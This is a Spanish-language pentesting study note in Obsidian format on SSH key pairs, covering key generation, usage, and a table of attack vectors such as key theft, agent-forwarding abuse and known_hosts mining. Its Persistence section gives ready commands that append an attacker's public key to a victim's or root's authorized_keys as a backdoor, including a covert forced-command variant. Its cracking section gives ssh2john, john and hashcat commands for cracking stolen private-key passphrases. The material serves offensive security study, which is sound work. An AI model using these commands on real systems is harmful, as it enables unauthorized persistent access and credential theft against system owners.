---
aliases:
  - SSH Keys
  - SSH Key Pairs
tags:
  - estado/completo
  - service/ssh
  - cred/ssh
kind: Concept
linked:
  - "[[SSH (22) - Enumeración]]"
---
# Pares de claves SSH

> [!info]
> Autenticación SSH via key-pair (asimétrica). Private key local del cliente, public key en `~/.ssh/authorized_keys` del server. Vectores: theft, weak key, default keys, agent abuse.

***

## Generación

```bash
# Generar par RSA 4096
ssh-keygen -t rsa -b 4096 -f mykey -N ''  # -N '' = sin passphrase

# Ed25519 (moderno, recomendado)
ssh-keygen -t ed25519 -f mykey -N ''
```

Genera:
- `mykey` (private, modo `600`)
- `mykey.pub` (public, agregar a `authorized_keys` del target)

***

## Uso

```bash
# Setup
chmod 600 mykey
ssh -i mykey user@target

# Si server rejecta nuevas keys
ssh -i mykey -o IdentitiesOnly=yes user@target
```

***

## Vectores de ataque

| Vector | Descripción |
|---|---|
| **Key theft** | Robar private key desde filesystem (`/home/*/.ssh/id_rsa`) post-exploit |
| **Authorized keys plant** | Si tenés write access a `~/.ssh/authorized_keys`, agregar tu pub key |
| **Default/leaked keys** | Vendors con keys hardcoded (CVE-2008-0166 OpenSSL Debian) |
| **Passphrase crack** | `ssh2john id_rsa > h; john --wordlist=rockyou.txt h` |
| **Agent forwarding abuse** | `SSH_AUTH_SOCK` → impersonar usuarios pivoting |
| **Known_hosts mining** | `~/.ssh/known_hosts` lista hosts donde el user se conectó |
| **No host check** | `StrictHostKeyChecking=no` → MITM trivial |
| **Weak key sizes** | RSA <2048, DSA |

***

## Persistence

```bash
# Plant key en victima
echo 'ssh-ed25519 AAAA... attacker' >> ~/.ssh/authorized_keys

# Si root → backdoor accesible siempre
echo 'ssh-ed25519 AAAA... pwn' >> /root/.ssh/authorized_keys

# Restrict to specific command (covert)
echo 'command="/bin/bash" ssh-ed25519 AAAA...' >> ~/.ssh/authorized_keys
```

***

## Crack passphrase

```bash
# Hash extract
ssh2john id_rsa > sshkey.hash

# Crack
john --wordlist=rockyou.txt sshkey.hash
hashcat -m 22921 sshkey.hash rockyou.txt  # SSH RSA
hashcat -m 22931 sshkey.hash rockyou.txt  # SSH ED25519
```

***

## Notas Relacionadas

- [[SSH (22) - Enumeración]]
- [[Cracking Hashes]]
- [[Linux Privilege Escalation]]
